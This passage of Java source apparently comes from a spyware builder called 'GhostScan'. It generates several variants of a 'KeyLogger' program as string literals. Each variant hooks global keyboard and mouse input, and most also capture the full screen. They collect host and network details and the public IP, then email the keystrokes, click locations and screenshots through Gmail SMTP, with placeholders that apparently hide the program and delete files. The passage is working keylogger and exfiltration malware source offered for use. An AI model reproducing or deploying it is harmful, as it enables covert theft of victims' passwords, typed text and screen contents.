										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"		
									
+init    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile			    
+ocult				


									
								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRegSrc = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e) {"
														
											+"e.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"		
									
								    
+init   
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile							
+ocult							


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRegSrcIp = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e) {"
														
											+"e.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
								    
+init  
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile						
+ocult								
					


									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRegScrIpRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
